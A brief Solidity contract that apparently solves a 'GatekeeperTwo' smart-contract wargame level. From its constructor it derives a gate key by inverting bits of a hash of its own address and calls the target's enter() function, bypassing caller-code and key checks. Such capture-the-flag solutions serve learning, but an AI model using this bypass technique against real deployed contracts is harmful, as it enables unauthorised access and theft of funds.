// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperTwoAttacker {
    constructor(address _target) {
        bytes8 gateKey;
        unchecked {
            gateKey = bytes8(
                ~uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
            );
        }
        IGatekeeperTwo(_target).enter(gateKey);
    }
}
